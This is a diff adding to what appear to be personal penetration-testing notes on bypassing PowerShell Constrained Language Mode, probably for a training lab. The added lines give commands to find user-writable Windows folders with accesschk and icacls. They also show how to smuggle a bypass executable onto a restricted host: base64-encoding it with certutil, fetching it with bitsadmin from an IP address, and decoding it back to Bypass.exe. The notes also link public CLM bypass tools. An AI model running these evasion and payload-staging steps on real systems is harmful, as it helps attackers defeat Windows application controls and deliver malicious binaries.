@@ -3,8 +3,18 @@ https://github.com/calebstewart/bypass-clm/tree/master/bypass-clm
 https://github.com/padovah4ck/PSByPassCLM
 https://github.com/Sh3lldon/FullBypass
 
+
 Checking Permission
     $ExecutionContext.SessionState.LanguageMode
+
+locate user-writable folders
+    accesschk.exe "student" C:\Windows -wus  (write permission)
+
+    accesschk.exe -qwsu student C:\Windows  (write and exec permission)
+
+Verify the folder permission
+    icacls.exe C:\Windows\Tasks
+
 
 Basic Bypass
     1, Trusted folder
@@ -13,6 +23,7 @@ Basic Bypass
 
 When in constraint LanguageMode, directly using powershell cant download the bypass.exe from host machine
     1, Using base64 obfuscating
+        [Convert]::ToBase64String((Get-Content -path "./20250218065830_all.zip" -Encoding byte))
         certutil -encode C:\Bypass.exe normal.txt
         bitsadmin /Transfer myJob http://192.168.0.0/file.txt C:\Users\student\enc.txt
         certutil -decode enc.txt Bypass.exe
